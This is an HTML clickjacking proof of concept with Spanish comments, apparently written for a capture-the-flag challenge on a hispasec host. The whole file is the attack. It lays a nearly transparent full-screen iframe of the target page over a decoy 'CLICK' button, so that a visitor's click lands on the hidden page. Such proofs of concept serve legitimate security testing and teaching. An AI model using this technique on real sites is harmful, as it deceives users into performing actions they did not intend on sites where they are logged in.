<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Clickjacking Exploit</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; }

        /* Hacemos que el bot√≥n ocupe TODA la pantalla */
        #objetivo {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1; /* Debajo del iframe */
            opacity: 1;
            cursor: pointer;
        }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 2; /* Encima para recibir el clic */
            /* IMPORTANTE: Usa una opacidad muy baja pero no 0 absoluto */
            opacity: 0.001; 
        }
    </style>
</head>
<body>

    <button id="objetivo">CLICK</button>

    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>

</body>
</html>
